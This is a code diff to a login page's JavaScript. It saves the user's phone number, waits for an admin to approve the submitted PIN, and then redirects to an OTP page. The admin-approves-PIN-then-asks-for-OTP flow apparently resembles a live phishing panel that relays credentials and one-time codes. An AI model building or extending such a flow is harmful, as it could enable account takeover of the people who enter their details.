@@ -44,6 +44,9 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   messageDiv.innerText = '';
   messageDiv.style.color = '#0753a6';
 
+  // Save phone number so the OTP page can use it
+  localStorage.setItem('loginPhone', phone);
+
   try {
     const response = await fetch('/api/login', {
       method: 'POST',
@@ -59,18 +62,19 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
       return;
     }
 
+    // If backend says already authenticated, go straight to OTP
     if (data.authenticated) {
-      btn.innerText = 'LOGIN SUCCESSFUL';
-      btn.style.backgroundColor = '#13834b';
-      messageDiv.style.color = 'green';
-      messageDiv.innerText = 'You are logged in successfully!';
+      window.location.href = '/otp.html';
       return;
     }
 
+    // If pending admin approval, start polling
     if (data.status === 'pending_pin_approval' && data.applicationId) {
       btn.innerText = 'Waiting for Admin Approval...';
       btn.style.backgroundColor = '#e6a800';
-      startLivePolling(data.applicationId, btn, messageDiv);
+      // Save app ID for later if needed
+      localStorage.setItem('applicationId', data.applicationId);
+      startLivePolling(data.applicationId, btn, messageDiv, phone);
     }
   } catch (err) {
     messageDiv.style.color = 'red';
@@ -85,7 +89,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   }
 });
 
-function startLivePolling(applicationId, btn, messageDiv) {
+function startLivePolling(applicationId, btn, messageDiv, phone) {
   let dots = 0;
   const loadingInterval = setInterval(() => {
     dots = (dots + 1) % 4;
@@ -102,9 +106,14 @@ function startLivePolling(applicationId, btn, messageDiv) {
         clearInterval(loadingInterval);
         clearInterval(pollInterval);
         messageDiv.style.color = 'green';
-        messageDiv.innerText = 'PIN Approved!';
-        btn.innerText = 'LOGIN SUCCESSFUL';
+        messageDiv.innerText = 'PIN Approved! Redirecting to OTP...';
+        btn.innerText = 'REDIRECTING...';
         btn.style.backgroundColor = '#13834b';
+        
+        // 🔥 REDIRECT TO OTP PAGE HERE
+        setTimeout(() => {
+            window.location.href = '/otp.html';
+        }, 1000);
       }
       if (statusData.pin_status === 'rejected') {
         clearInterval(loadingInterval);
